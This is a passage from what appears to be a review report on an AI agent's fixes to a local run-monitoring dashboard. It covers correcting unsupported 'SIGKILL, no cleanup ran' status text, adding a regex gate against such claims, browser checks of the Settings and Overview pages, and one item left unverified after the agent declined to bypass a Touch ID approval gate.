drift the whole exercise was about was still shipping, in the page that fixed it. Both sites now
derive from `statusMeta()`; `TODAY_ORDER` lives in the vocabulary carrying **order only**, with a
test asserting it stays a flat list of keys.

*A sentence three pages had refused, still shipping in three others.* B1 dropped "hard stop was
active" and wrote down why; C1 refused it again for Overview. Meanwhile `runs.js` told every killed
run "hard stop was active — SIGKILL, no cleanup ran", and `runs-log.js` and `overview-logic.js`
carried the SIGKILL half. Reading `lib/runner.js`'s `kill()` shows all three clauses fail: a
**queued** run is dequeued and marked killed with **no signal at all**; a running one gets
**SIGTERM** and only reaches SIGKILL after `KILL_GRACE_MS`, so cleanup may well have run; and no
reason is recorded, so a manual kill and a hard-pause `killAll` are indistinguishable. The
`overview-logic.js` site is the sharpest illustration — its comment says "never claim a specific
cause here" and the next line claimed one. All three now say "stopped immediately", which is the
most that is always true.

*Two of C1's own tests were pinning the falsehoods*, including one literally named "killed never
claims a specific cause the run record cannot back" whose body asserted
`/SIGKILL, no cleanup ran/`. A test can enforce a lie as easily as a truth.

**The generalisation, now encoded rather than written down.** A new gate lists claims the data
cannot support (`hard stop was active`, `no cleanup ran`, the `'failed'` spelling) and fails if any
`/v2` page contains one. Comments are stripped first so the gate's own explanation doesn't trip it.
Three prose refusals had been recorded in three separate files' comments and none of them stopped a
fourth page from making the claim; a regex does.

C1 also honestly reported that ~12 of its 22 tests were reviewed but not individually mutated. Two
were sampled at the merge bar (`fmtDayTime` losing the weekday, `burstSummary` inventing a
confidence band) and both went red, so the batch is load-bearing rather than decorative.

**Browser legs.** Settings on 43414 and Overview on 43412, both isolated with throwaway `CS_DATA`,
both themes. Settings: 16 setrows, Save honestly disabled, danger fields empty and disabled with
reasons, and clicking Wipe hit the real approval helper and took its honest `approval_unavailable`
refusal — nothing bypassed, weakened or installed. Overview: 5 cards, chips from the shared
vocabulary, and the today strip now reads "3 fail" rather than "3 failed" — the fix observed in a
browser, not just in a test. Zero console errors either page beyond the known favicon 404. Both
instances stopped; 43400 answers 200.

**Still open from C1, honestly.** Wind-down/Stop-now against a *genuinely runner-tracked* live run
is UNVERIFIED: the seeded running rows were DB-only, bypassing `lib/runner.js`'s in-memory
tracking, so the POST fired without error and without effect. The agent declined to route around
the Touch ID gate to create a real run, which is the correct call. Port 43411 remains held by pid
39469 from two sessions ago.
